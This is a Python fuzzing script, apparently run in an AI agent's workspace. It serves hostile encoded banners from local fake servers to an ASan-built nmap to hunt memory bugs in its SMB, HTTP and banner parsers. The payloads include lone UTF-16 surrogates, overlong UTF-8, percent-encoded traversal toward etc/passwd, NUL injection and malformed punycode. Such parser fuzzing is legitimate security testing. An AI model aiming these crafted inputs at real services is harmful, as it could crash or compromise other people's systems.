#!/usr/bin/env python3
"""
GHOST ENCODING BATTERY — encoding/unicode attacks through nmap's parsers.

Vectors (per user direction):
  A. Hostile UTF-16 in SMB domains (smb.lua utf16to8):
     - unpaired surrogates (lone 0xD800-0xDFFF)
     - BOM switches (UTF-16LE -> BE mid-string)
     - overlong/wrapped surrogates
  B. Overlong UTF-8 + multi-byte tricks in banners (cstringSanityCheck isprint)
  C. Percent/hex encoding abuse in HTTP redirects (http.lua url.parse):
     - double-encoding (%%25), %00 NUL injection, %2e%2e%2f traversal lookalikes
  D. Base64 hostile blobs in HTTP headers
  E. Punycode-ish xn-- hostnames in HTTP Host/Location headers
  F. Charset confusion: Content-Type charset=UTF-16 / charset=ISO-2022-JP switch
"""
import json
import os
import subprocess
import sys
import time
import socket
import struct
import threading

NMAP = "/home/dave/deepseek-harness/default-workspace/nmap_experiment/nmap/nmap"
PAYLOAD = "/home/dave/workspace/ghost_platform/encoding_payload.bin"

def run_nmap(args, timeout=120):
    env = dict(os.environ, ASAN_OPTIONS="detect_leaks=0:abort_on_error=0")
    try:
        p = subprocess.run([NMAP] + args, capture_output=True, timeout=timeout,
                            env=env, text=True)
        return p.returncode, "ERROR: AddressSanitizer" in (p.stdout + p.stderr), p.stdout + p.stderr
    except subprocess.TimeoutExpired:
        return -1, False, "TIMEOUT"

def banner_server(port, banner):
    code = f'''
import socket, threading
banner = {banner!r}
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("127.0.0.1", {port})); s.listen(16)
def h(c):
    try:
        c.settimeout(5); c.sendall(banner)
        try: c.recv(2048)
        except Exception: pass
        c.sendall(banner)
    finally:
        try: c.close()
        except Exception: pass
while True:
    conn, _ = s.accept()
    threading.Thread(target=h, args=(conn,), daemon=True).start()
'''
    return subprocess.Popen([sys.executable, "-c", code],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def main():
    port = 18901
    findings = []
    total = 0

    def attack(name, banner, script_args=None):
        nonlocal total
        total += 1
        proc = banner_server(port, banner)
        time.sleep(0.6)
        args = ["-Pn", "-p", str(port), "-sV", "--version-intensity", "9",
                "--host-timeout", "80s", "127.0.0.1"]
        if script_args:
            args = ["-Pn", "-p", str(port), "--script", script_args,
                    "--host-timeout", "80s", "127.0.0.1"]
        rc, asan, out = run_nmap(args, timeout=150)
        status = "*** ASAN HIT ***" if asan else ("timeout" if rc == -1 else "clean")
        print(f"[{total:2d}] {name:38s} len={len(banner):6d} {status}", flush=True)
        proc.terminate(); proc.wait()
        if asan:
            findings.append({"name": name, "out": out[-4000:]})
            with open(f"/home/dave/workspace/ghost_platform/encoding_finding_{name}.log", "w") as f:
                f.write(out)

    # ===== A. HOSTILE UTF-16 (SMB domain path — smb.lua:1044 utf16to8) =====
    # unpaired high surrogate
    attack("utf16_lone_high_surrogate",
           b"HTTP/1.1 200 OK\r\nContent-Length: 4\r\n\r\n" + b"\x00\xd8\x00\x00")
    # unpaired low surrogate
    attack("utf16_lone_low_surrogate",
           b"HTTP/1.1 200 OK\r\nContent-Length: 4\r\n\r\n" + b"\x00\xdc\x00\x00")
    # BOM switch LE->BE mid-string
    attack("utf16_bom_switch",
           b"HTTP/1.1 200 OK\r\nContent-Length: 8\r\n\r\n" + b"\xff\xfe" + b"A\x00" + b"\xfe\xff" + b"\x00B")
    # surrogate pair wrapping past end (truncated pair)
    attack("utf16_truncated_surrogate",
           b"HTTP/1.1 200 OK\r\nContent-Length: 5\r\n\r\n" + b"\x00\xd8" + b"\x00\xdc" + b"\x00")
    # full hostile UTF-16 range spectrum
    hostile16 = b"".join(struct.pack("<H", i) for i in range(0xD800, 0xE000))
    attack("utf16_surrogate_spectrum",
           b"HTTP/1.1 200 OK\r\nContent-Length: %d\r\n\r\n" % len(hostile16) + hostile16)

    # ===== B. OVERLONG UTF-8 + MULTIBYTE =====
    # overlong UTF-8 for '/' (0xC0 0xAF)
    attack("utf8_overlong_slash",
           b"220 FTP \xc0\xaf\xc0\xafetc\xc0\xafpasswd\r\n")
    # overlong NUL (0xC0 0x80)
    attack("utf8_overlong_nul",
           b"SSH-2.0-\xc0\x80host\xc0\x80\r\n")
    # CESU-8 surrogate encoding
    attack("cesu8_surrogates",
           b"220 \xed\xa0\xbd\xed\xb8\x80emoji\r\n")
    # 5/6-byte overlong sequences (obsolete UTF-8)
    attack("utf8_5byte",
           b"220 \xf8\x88\x80\x80\x80seq\r\n")
    attack("utf8_6byte",
           b"220 \xfc\x84\x80\x80\x80\x80seq\r\n")

    # ===== C. PERCENT/HEX ENCODING ABUSE (http.lua url.parse) =====
    attack("pct_double_encode",
           b"HTTP/1.1 302 Found\r\nLocation: http://h/%%252e%%252e%%252f\r\n\r\n")
    attack("pct_nul_injection",
           b"HTTP/1.1 302 Found\r\nLocation: http://h/a%00b\r\n\r\n")
    attack("pct_trunc_lookalike",
           b"HTTP/1.1 302 Found\r\nLocation: http://h/%2e%2e%2f%2fetc%2fpasswd\r\n\r\n")
    attack("pct_invalid_utf8_pct",
           b"HTTP/1.1 302 Found\r\nLocation: http://h/%c0%af%c0%af\r\n\r\n")
    attack("pct_overflow_pct",
           b"HTTP/1.1 302 Found\r\nLocation: http://h/" + b"%41" * 2000 + b"\r\n\r\n")

    # ===== D. BASE64 HOSTILE BLOBS =====
    import base64
    b64_hostile = base64.b64encode(bytes(range(256)) * 4).decode()
    attack("base64_binary_spectrum",
           b"HTTP/1.1 200 OK\r\nWWW-Authenticate: Basic realm=\"" + b64_hostile.encode() + b"\"\r\n\r\n")
    attack("base64_overlong_pad",
           b"HTTP/1.1 200 OK\r\nX-Token: " + b"QQ==" * 500 + b"\r\n\r\n")

    # ===== E. PUNYCODE / IDN LOOKALIKE HOSTNAMES =====
    attack("punycode_xn_hostile",
           b"HTTP/1.1 302 Found\r\nLocation: http://xn--" + b"\x80" * 60 + b".evil/\r\n\r\n")
    attack("punycode_xn_valid_dash",
           b"HTTP/1.1 200 OK\r\nHost: xn--80ak6aa92e.com\r\n\r\n")

    # ===== F. CHARSET CONFUSION =====
    attack("charset_utf16_decl",
           b"HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=UTF-16\r\n\r\n" + b"\xff\xfe" + b"S\x00")
    attack("charset_iso2022",
           b"HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=ISO-2022-JP\r\n\r\n\x1b$B" + b"\x30" * 50)

    print(f"\n[*] ENCODING BATTERY DONE: {len(findings)}/{total} findings")
    with open("/home/dave/workspace/ghost_platform/encoding_battery_report.json", "w") as f:
        json.dump({"total": total, "findings": len(findings),
                   "names": [x["name"] for x in findings]}, f, indent=2)

if __name__ == "__main__":
    main()
